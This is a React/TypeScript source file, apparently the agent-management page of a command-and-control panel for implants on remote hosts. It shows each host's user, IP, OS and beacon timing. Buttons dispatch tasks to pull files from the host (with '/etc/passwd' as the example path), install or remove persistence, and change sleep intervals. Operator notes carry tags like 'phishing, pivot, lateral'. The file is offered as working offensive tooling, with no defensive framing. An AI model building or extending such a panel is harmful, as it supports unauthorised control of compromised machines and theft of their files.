import { useEffect, useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { getAgents, createTask, updateAgentNotes, deleteAgent, type Agent } from "../api/client";
import { RefreshCw, Terminal, Download, Shield, ShieldOff, Clock, CheckCircle, StickyNote, Trash2 } from "lucide-react";

function useCopyFlash() {
  const [flash, setFlash] = useState<string | null>(null);
  const copy = useCallback((text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setFlash(key);
    setTimeout(() => setFlash(null), 1400);
  }, []);
  return { flash, copy };
}

function AgentCard({ agent, onConsole, index, onDelete }: {
  agent: Agent; onConsole: () => void; index: number; onDelete: () => void;
}) {
  const diffSec = Math.floor((Date.now() - new Date(agent.last_seen + "Z").getTime()) / 1000);
  const alive   = diffSec < 30;
  const { flash, copy } = useCopyFlash();
  const [action, setAction]  = useState<string | null>(null);
  const [dlPath, setDlPath]  = useState("");
  const [sleepVal, setSleep] = useState(agent.sleep);
  const [feedback, setFb]    = useState("");
  const [notes, setNotes]    = useState(agent.notes ?? "");
  const [tags, setTags]      = useState(agent.tags ?? "");
  const [savingNotes, setSavingNotes] = useState(false);

  const send = async (cmd: string) => {
    await createTask(agent.id, cmd);
    setFb("TASK_DISPATCHED");
    setTimeout(() => setFb(""), 2500);
    setAction(null);
  };

  const saveNotes = async () => {
    setSavingNotes(true);
    await updateAgentNotes(agent.id, notes, tags);
    setSavingNotes(false);
    setFb("NOTES_SAVED");
    setTimeout(() => setFb(""), 2000);
    setAction(null);
  };

  const handleDelete = async () => {
    if (!confirm(`Delete agent ${agent.hostname}? This will also delete all its tasks.`)) return;
    await deleteAgent(agent.id);
    onDelete();
  };

  const ActionBtn = ({ icon: Icon, label, onClick, danger }: {
    icon: React.ElementType; label: string; onClick: () => void; danger?: boolean;
  }) => (
    <motion.button
      onClick={onClick}
      whileTap={{ scale: 0.95 }}
      className="flex items-center gap-1.5 text-xs px-3 py-1.5"
      style={{
        background: "transparent",
        border: "1px solid #1F1F1F",
        color: danger ? "#4A4A4A" : "#4A4A4A",
        fontFamily: "'Fira Code', monospace",
        cursor: "pointer",
        transition: "all 0.12s",
      }}
      onMouseEnter={e => {
        const el = e.currentTarget as HTMLElement;
        if (danger) {
          el.style.color = "#FF3333";
          el.style.borderColor = "rgba(255,51,51,0.3)";
          el.style.background = "rgba(255,51,51,0.05)";
        } else {
          el.style.color = "#00FF41";
          el.style.borderColor = "rgba(0,255,65,0.25)";
          el.style.background = "rgba(0,255,65,0.04)";
        }
      }}
      onMouseLeave={e => {
        const el = e.currentTarget as HTMLElement;
        el.style.color = "#4A4A4A";
        el.style.borderColor = "#1F1F1F";
        el.style.background = "transparent";
      }}
    >
      <Icon size={11} /> {label}
    </motion.button>
  );

  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: index * 0.07, duration: 0.3, ease: [0.25, 0.46, 0.45, 0.94] }}
      className="hud-panel hud-corners"
      style={{ padding: "20px" }}
    >
      {/* Header */}
      <div className="flex items-start justify-between mb-4">
        <div className="flex items-center gap-3">
          <div
            className="w-9 h-9 flex items-center justify-center text-sm font-bold"
            style={{
              fontFamily: "'Fira Code', monospace",
              background: "transparent",
              border: `1px solid ${alive ? "rgba(0,255,65,0.3)" : "#1F1F1F"}`,
              color: alive ? "#00FF41" : "#4A4A4A",
              boxShadow: alive ? "0 0 8px rgba(0,255,65,0.15)" : "none",
            }}
          >
            {agent.hostname[0].toUpperCase()}
          </div>
          <div>
            <div
              className="text-sm font-bold"
              style={{ fontFamily: "'Fira Code', monospace", color: "#E0E0E0" }}
            >
              {agent.hostname}
            </div>
            <div
              className="text-xs mt-0.5"
              style={{ fontFamily: "'Fira Code', monospace", color: "#2A2A2A" }}
            >
              {agent.id.slice(0, 16)}…
            </div>
          </div>
        </div>
        <span
          className={`text-xs px-2 py-0.5 ${alive ? "status-active" : "status-offline"}`}
          style={{ fontFamily: "'Fira Code', monospace" }}
        >
          {alive ? "ACTIVE" : "OFFLINE"}
        </span>
      </div>

      {/* Metadata grid */}
      <div
        className="grid grid-cols-2 gap-x-4 gap-y-2.5 mb-4 p-3"
        style={{ background: "#050505", border: "1px solid #1A1A1A" }}
      >
        {[
          ["USER",    agent.username,                                              false],
          ["PLAT",    `${agent.os}/${agent.arch}`,                               false],
          ["IP",      agent.ip,                                                   true],
          ["SEEN",    diffSec < 60 ? `${diffSec}s_ago` : `${Math.floor(diffSec / 60)}m_ago`, false],
          ["SLEEP",   `${agent.sleep}s`,                                         false],
          ["JITTER",  `${agent.jitter}s`,                                        false],
        ].map(([label, value, copyable]) => (
          <div key={label as string}>
            <div
              className="text-xs mb-0.5 tracking-widest"
              style={{ fontFamily: "'Fira Code', monospace", color: "#2A2A2A", fontSize: "9px" }}
            >
              {label}
            </div>
            <div
              className="text-xs"
              onClick={copyable ? () => copy(value as string, label as string) : undefined}
              title={copyable ? "Click to copy" : undefined}
              style={{
                fontFamily: "'Fira Code', monospace",
                color: (copyable && flash === label) ? "#00FF41" : "#9A9A9A",
                cursor: copyable ? "pointer" : "default",
                transition: "color 0.15s",
              }}
            >
              {(copyable && flash === label) ? "COPIED!" : value}
            </div>
          </div>
        ))}
      </div>

      {/* Feedback */}
      <AnimatePresence>
        {feedback && (
          <motion.div
            initial={{ opacity: 0, height: 0, marginBottom: 0 }}
            animate={{ opacity: 1, height: "auto", marginBottom: 10 }}
            exit={{ opacity: 0, height: 0, marginBottom: 0 }}
            className="flex items-center gap-2 px-3 py-1.5 text-xs overflow-hidden"
            style={{
              fontFamily: "'Fira Code', monospace",
              color: "#00FF41",
              background: "rgba(0,255,65,0.05)",
              border: "1px solid rgba(0,255,65,0.2)",
            }}
          >
            <CheckCircle size={11} /> {feedback}
          </motion.div>
        )}

        {action === "download" && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            exit={{ opacity: 0, height: 0 }}
            className="mb-3 flex gap-2 overflow-hidden"
          >
            <input
              value={dlPath}
              onChange={e => setDlPath(e.target.value)}
              placeholder="/etc/passwd"
              className="input-base flex-1 px-3 py-1.5 text-xs"
            />
            <button
              onClick={() => send(`download ${dlPath}`)}
              className="btn-primary px-3 py-1.5"
            >
              GET
            </button>
            <button
              onClick={() => setAction(null)}
              className="btn-ghost px-2 text-xs"
            >
              ✕
            </button>
          </motion.div>
        )}

        {action === "sleep" && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            exit={{ opacity: 0, height: 0 }}
            className="mb-3 flex gap-2 items-center overflow-hidden"
          >
            <input
              type="number"
              value={sleepVal}
              onChange={e => setSleep(e.target.value)}
              className="input-base w-20 px-3 py-1.5 text-xs"
            />
            <span
              className="text-xs"
              style={{ fontFamily: "'Fira Code', monospace", color: "#4A4A4A" }}
            >
              sec
            </span>
            <button
              onClick={async () => {
                await send(`sleep ${sleepVal}`);
                fetch(`http://localhost:8000/api/agents/${agent.id}/sleep?sleep=${sleepVal}&jitter=1`, {
                  method: "PATCH",
                  headers: { Authorization: `Bearer ${localStorage.getItem("nyx_token")}` },
                });
              }}
              className="btn-primary px-3 py-1.5"
            >
              SET
            </button>
            <button onClick={() => setAction(null)} className="btn-ghost px-2 text-xs">✕</button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Action buttons */}
      <div className="flex gap-1.5 flex-wrap">
        <ActionBtn icon={Terminal}   label="Console"   onClick={onConsole} />
        <ActionBtn icon={Download}   label="Download"  onClick={() => setAction(action === "download" ? null : "download")} />
        <ActionBtn icon={Shield}     label="Persist"   onClick={() => send("persist")} />
        <ActionBtn icon={ShieldOff}  label="Unpersist" onClick={() => send("unpersist")} danger />
        <ActionBtn icon={Clock}      label="Sleep"     onClick={() => setAction(action === "sleep" ? null : "sleep")} />
        <ActionBtn icon={StickyNote} label="Notes"     onClick={() => setAction(action === "notes" ? null : "notes")} />
        <ActionBtn icon={Trash2}     label="Delete"    onClick={handleDelete} danger />
      </div>

      {/* Notes panel */}
      <AnimatePresence>
        {action === "notes" && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            exit={{ opacity: 0, height: 0 }}
            transition={{ duration: 0.2 }}
            className="mt-3 flex flex-col gap-2 overflow-hidden"
          >
            <input
              value={tags}
              onChange={e => setTags(e.target.value)}
              placeholder="tags: phishing, pivot, lateral"
              className="input-base px-3 py-1.5 text-xs w-full"
            />
            <textarea
              value={notes}
              onChange={e => setNotes(e.target.value)}
              placeholder="operator notes..."
              rows={3}
              className="input-base px-3 py-1.5 text-xs w-full resize-none"
            />
            <div className="flex gap-2">
              <button
                onClick={saveNotes}
                disabled={savingNotes}
                className="btn-primary px-3 py-1.5 flex items-center gap-1.5"
              >
                {savingNotes
                  ? <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                      style={{ width: 10, height: 10, border: "1px solid #00FF41", borderTopColor: "transparent", borderRadius: "50%" }} />
                  : <CheckCircle size={10} />}
                SAVE
              </button>
              <button onClick={() => setAction(null)} className="btn-ghost px-3 py-1.5">CANCEL</button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Tags / Notes display */}
      {(tags || notes) && action !== "notes" && (
        <div
          className="mt-3 pt-3 flex flex-col gap-1.5"
          style={{ borderTop: "1px solid #1F1F1F" }}
        >
          {tags && (
            <div className="flex flex-wrap gap-1">
              {tags.split(",").filter(Boolean).map(t => (
                <span
                  key={t}
                  className="text-xs px-1.5 py-0.5"
                  style={{
                    fontFamily: "'Fira Code', monospace",
                    color: "#00FF41",
                    background: "rgba(0,255,65,0.05)",
                    border: "1px solid rgba(0,255,65,0.15)",
                  }}
                >
                  #{t.trim()}
                </span>
              ))}
            </div>
          )}
          {notes && (
            <p
              className="text-xs"
              style={{ fontFamily: "'Fira Code', monospace", color: "#4A4A4A" }}
            >
              {notes}
            </p>
          )}
        </div>
      )}
    </motion.div>
  );
}

interface AgentsProps { onNavigateConsole?: () => void; }

export default function Agents({ onNavigateConsole }: AgentsProps) {
  const [agents, setAgents]   = useState<Agent[]>([]);
  const [loading, setLoading] = useState(false);
  const [query, setQuery]     = useState("");

  const load = () => {
    setLoading(true);
    getAgents().then(setAgents).finally(() => setLoading(false));
  };

  useEffect(() => {
    load();
    const i = setInterval(load, 5000);
    return () => clearInterval(i);
  }, []);

  const q = query.trim().toLowerCase();
  const filtered = q
    ? agents.filter(a =>
        a.hostname.toLowerCase().includes(q) ||
        a.ip.toLowerCase().includes(q) ||
        a.username.toLowerCase().includes(q) ||
        a.os.toLowerCase().includes(q)
      )
    : agents;

  return (
    <div className="p-6 space-y-5" style={{ minHeight: "100%", background: "#000" }}>
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.25 }}
        className="flex items-center justify-between"
      >
        <div>
          <h1
            className="text-lg font-bold tracking-widest uppercase"
            style={{
              fontFamily: "'Fira Code', monospace",
              color: "#00FF41",
              textShadow: "0 0 10px rgba(0,255,65,0.5)",
            }}
          >
            // AGENTS
          </h1>
          <p
            className="text-xs mt-1"
            style={{ fontFamily: "'Fira Code', monospace", color: "#4A4A4A" }}
          >
            {q ? `${filtered.length} / ${agents.length} nodes` : `${agents.length} registered nodes`}
          </p>
        </div>
        <motion.button
          onClick={load}
          whileTap={{ scale: 0.95 }}
          className="btn-ghost flex items-center gap-2 px-3 py-1.5"
        >
          <motion.span
            animate={loading ? { rotate: 360 } : { rotate: 0 }}
            transition={loading ? { duration: 0.8, repeat: Infinity, ease: "linear" } : {}}
          >
            <RefreshCw size={12} />
          </motion.span>
          REFRESH
        </motion.button>
      </motion.div>

      {/* Search */}
      <motion.div
        initial={{ opacity: 0, y: 6 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1, duration: 0.2 }}
      >
        <input
          value={query}
          onChange={e => setQuery(e.target.value)}
          placeholder="filter by hostname / ip / user / os..."
          className="input-base w-full px-3 py-2 text-xs"
          style={{ fontFamily: "'Fira Code', monospace" }}
        />
      </motion.div>

      {/* Grid */}
      <div className="grid gap-4 md:grid-cols-2">
        {filtered.length === 0 && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="col-span-2 hud-panel p-12 text-center text-xs"
            style={{ fontFamily: "'Fira Code', monospace", color: "#2A2A2A" }}
          >
            {q ? `[ NO MATCH FOR "${query}" ]` : "[ NO AGENTS CONNECTED ]"}
          </motion.div>
        )}
        {filtered.map((a, i) => (
          <AgentCard
            key={a.id}
            agent={a}
            onConsole={() => onNavigateConsole?.()}
            index={i}
            onDelete={load}
          />
        ))}
      </div>
    </div>
  );
}
